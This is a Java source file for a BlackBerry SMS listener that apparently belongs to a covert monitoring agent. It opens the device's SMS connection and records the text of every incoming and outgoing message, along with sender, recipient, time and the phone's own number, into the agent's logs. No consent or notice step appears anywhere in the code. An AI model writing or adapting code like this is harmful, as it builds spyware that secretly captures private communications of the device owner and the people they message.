package blackberry.agent.sms;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;

import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.util.DataBuffer;

import blackberry.Device;
import blackberry.agent.MessageAgent;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public class SmsListener {
    private static final int SMS_VERSION = 2010050501;

    // #debug
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);

    MessageConnection smsconn;
    SMSINListener insms;
    MessageAgent messageAgent;

    public SmsListener(final MessageAgent messageAgent) {
        this.messageAgent = messageAgent;
    }

    public final void start() {
        try {

            smsconn = (MessageConnection) Connector.open("sms://:0");
            insms = new SMSINListener((MessageConnection) smsconn, this);

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public final void stop() {
        try {
            if(smsconn!=null){
                smsconn.close();
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } finally {
            smsconn = null;
        }
    }

    public void run() {
        new Thread(insms).start();
        try {
            smsconn.setMessageListener(insms);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    synchronized void saveLog(final javax.wireless.messaging.Message message,
            boolean incoming) {
        String msg = null;

        //#debug debug
        debug.trace("saveLog: " + message);

        if (message instanceof TextMessage) {
            TextMessage tm = (TextMessage) message;
            msg = tm.getPayloadText();
            //#debug info
            debug.info("Got Text SMS: " + msg);

        } else if (message instanceof BinaryMessage) {
            byte[] data = ((BinaryMessage) message).getPayloadData();

            try {
                msg = new String(data, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                //#debug error
                debug.error("saveLog:" + e);
                return;
            }
            //#debug info
            debug.info("Got Binary SMS: " + msg);
        }

        ByteArrayOutputStream os = null;
        try {

            final int flags = incoming ? 1 : 0;
            final DateTime filetime = new DateTime(message.getTimestamp());
            final byte[] additionalData = new byte[20];

            String from;
            String to;
            String address = message.getAddress();
           
            final String prefix = "sms://";
            if(address.indexOf(prefix) == 0){
                address = address.substring(prefix.length());
            }

            if (incoming) {
                from = address;
                to = getMyAddress();
            } else {
                from = getMyAddress();
                to = address;
            }

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from, 16));
            databuffer.write(Utils.padByteArray(to, 16));

            //#debug info
            debug.info("Received sms : " + (incoming?"incoming":"outgoing"));
            //#debug info
            debug.info("From: " +from + " To: "+ to +" date: "+filetime);
                        
            //Check.ensures(additionalData.length == 56, "Wrong buffer size");

            messageAgent.createLog(additionalData, WChar.getBytes(msg), LogType.SMS_NEW);

        } catch (final Exception ex) {
            //#debug error
            debug.error("saveLog message: " + ex);

        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (final IOException e) {
                }
            }
        }
    }

    private String getMyAddress() {
        String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith("Unknown")) {
            return "local";
        }

        //#ifdef DBC
        Check.ensures(number.length() <= 16, 
                "getMyAddress too long: " + number);
        //#endif

        return number;
    }

}
